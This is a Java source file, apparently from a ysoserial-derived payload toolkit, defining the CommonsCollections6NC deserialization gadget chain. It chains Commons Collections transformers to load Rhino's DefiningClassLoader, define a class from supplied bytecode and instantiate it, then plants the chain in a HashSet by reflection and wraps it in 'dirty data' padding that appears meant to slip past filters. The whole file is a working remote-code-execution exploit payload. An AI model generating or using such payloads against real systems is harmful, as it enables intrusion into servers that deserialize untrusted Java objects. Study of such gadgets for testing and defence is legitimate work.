package yso.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.mozilla.javascript.DefiningClassLoader;
import yso.payloads.util.DirtyDataWrapper;
import yso.payloads.util.Reflections;

import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;

public class CommonsCollections6NC {
    public CommonsCollections6NC() {
    }

    public static Object getObject(byte[] var0, String var1, int var2) {
        TiedMapEntry var3 = new TiedMapEntry(LazyMap.decorate(new HashMap(),
                new ChainedTransformer(
                        new Transformer[]{
                                new ConstantTransformer(DefiningClassLoader.class),
                                new InvokerTransformer("getDeclaredConstructor",
                                        new Class[]{Class[].class}, new Object[]{new Class[0]}),
                                new InvokerTransformer("newInstance",
                                        new Class[]{Object[].class},
                                        new Object[]{new Object[0]}),
                                new InvokerTransformer("defineClass",
                                        new Class[]{String.class, byte[].class},
                                        new Object[]{var1, var0}),
                                new InvokerTransformer("getDeclaredConstructor",
                                        new Class[]{Class[].class}, new Object[]{new Class[0]}),
                                new InvokerTransformer("newInstance",
                                        new Class[]{Object[].class},
                                        new Object[]{new Object[0]}),
                                new ConstantTransformer(new HashSet())})), "foo");
        HashSet var4 = new HashSet(1);
        var4.add("foo");

        try {
            Field var5;
            try {
                var5 = HashSet.class.getDeclaredField("map");
            } catch (NoSuchFieldException var14) {
                var5 = HashSet.class.getDeclaredField("backingMap");
            }

            Reflections.setAccessible(var5);
            HashMap var6 = (HashMap)var5.get(var4);

            Field var7;
            try {
                var7 = HashMap.class.getDeclaredField("table");
            } catch (NoSuchFieldException var13) {
                var7 = HashMap.class.getDeclaredField("elementData");
            }

            Reflections.setAccessible(var7);
            Object[] var8 = (Object[])((Object[])var7.get(var6));
            Object var9 = var8[0];
            if (var9 == null) {
                var9 = var8[1];
            }

            Field var10 = null;

            try {
                var10 = var9.getClass().getDeclaredField("key");
            } catch (Exception var12) {
                var10 = Class.forName("java.util.MapEntry").getDeclaredField("key");
            }

            Reflections.setAccessible(var10);
            var10.set(var9, var3);
            DirtyDataWrapper var11 = new DirtyDataWrapper(var4, var2);
            return var11.doWrap();
        } catch (Throwable var15) {
            return null;
        }
    }
}
